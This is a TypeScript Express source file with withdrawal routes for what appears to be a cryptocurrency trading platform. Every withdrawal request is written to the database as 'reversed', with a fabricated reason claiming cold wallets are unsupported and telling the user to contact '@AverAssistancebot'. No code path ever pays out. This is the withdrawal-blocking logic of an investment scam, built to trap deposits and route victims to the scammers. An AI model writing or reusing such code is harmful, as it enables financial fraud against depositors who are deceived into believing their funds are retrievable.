import { Router } from "express";
import { db } from "@workspace/db";
import { withdrawalsTable, accountsTable } from "@workspace/db";
import { eq, desc } from "drizzle-orm";
import { requireAuth } from "../lib/auth";
import { CRYPTO_RATES } from "../lib/trading";

const router = Router();

const REVERSAL_REASON = "Transaction reversed: Wallet type mismatch detected. Cold wallet addresses are not supported for withdrawals. Please use a hot wallet and contact @AverAssistancebot for assistance.";

router.post("/withdraw", requireAuth, async (req, res) => {
  const { amount, crypto, walletAddress } = req.body;
  if (!amount || !crypto || !walletAddress) {
    res.status(400).json({ error: "Amount, crypto, and wallet address are required" });
    return;
  }

  const withdrawAmount = parseFloat(String(amount));
  const [acct] = await db.select().from(accountsTable).where(eq(accountsTable.userId, req.userId!)).limit(1);
  const totalBalance = acct ? parseFloat(acct.tradingBalance) + parseFloat(acct.profitReserve) + parseFloat(acct.withdrawableBalance) : 0;

  if (withdrawAmount > totalBalance) {
    res.status(400).json({ error: "Insufficient balance" });
    return;
  }

  const rate = CRYPTO_RATES.find(r => r.symbol === crypto);
  const cryptoAmount = rate ? withdrawAmount / rate.usdRate : 0;

  const [withdrawal] = await db.insert(withdrawalsTable).values({
    userId: req.userId!,
    amount: String(withdrawAmount),
    crypto,
    walletAddress,
    status: "reversed",
    cryptoAmount: String(cryptoAmount.toFixed(8)),
    reversalReason: REVERSAL_REASON,
  }).returning();

  res.json({
    id: withdrawal.id, userId: withdrawal.userId,
    amount: parseFloat(withdrawal.amount),
    crypto: withdrawal.crypto,
    walletAddress: withdrawal.walletAddress,
    status: withdrawal.status,
    cryptoAmount: parseFloat(withdrawal.cryptoAmount ?? "0"),
    reversalReason: withdrawal.reversalReason,
    createdAt: withdrawal.createdAt.toISOString(),
  });
});

router.get("/withdraw", requireAuth, async (req, res) => {
  const withdrawals = await db.select().from(withdrawalsTable)
    .where(eq(withdrawalsTable.userId, req.userId!))
    .orderBy(desc(withdrawalsTable.createdAt));
  res.json(withdrawals.map(w => ({
    id: w.id, userId: w.userId, amount: parseFloat(w.amount),
    crypto: w.crypto, walletAddress: w.walletAddress, status: w.status,
    cryptoAmount: parseFloat(w.cryptoAmount ?? "0"),
    reversalReason: w.reversalReason,
    createdAt: w.createdAt.toISOString(),
  })));
});

export default router;
